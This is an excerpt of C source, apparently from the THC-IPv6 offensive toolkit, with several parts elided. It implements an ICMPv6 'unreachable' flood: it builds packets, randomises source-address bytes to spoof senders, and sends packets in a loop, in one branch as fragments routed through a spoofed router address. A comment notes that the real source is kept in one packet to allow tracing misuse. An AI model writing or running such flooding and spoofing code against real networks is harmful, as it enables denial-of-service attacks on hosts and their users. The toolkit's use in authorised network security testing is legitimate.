...
int main(int argc, char *argv[]) {
  ...
  // we keep our real source in the packet to report as unreachable to allow tracing misuse of the tool
  if ((pkt2 = thc_create_ipv6_extended(interface, PREFER_GLOBAL, &pkt_len2, dst, src, 0, 0, 0, 0, 0)) == NULL)
    return -1;
  if (thc_add_udp(pkt2, &pkt_len2, 53, 53, 0, NULL, 0) < 0)
    return -1;
  ...
  printf("Starting to flood with ICMPv6 unreachable on %s (Press Control-C to end, a dot is printed for every 1000 packets):\n", interface);
  while (until != 1) {
    if (rand_src > 0) {
      for (i = 0; i < 8; i++)
        src[8 + i] = rand() % 256;
    ...
    if (do_dst) {
      ...
      thc_send_as_fragment6(interface, oldrouter, dst, type, hdr2->pkt + 40 + offset, hdr2->pkt_len - 40 - offset, 1240);
    } else {
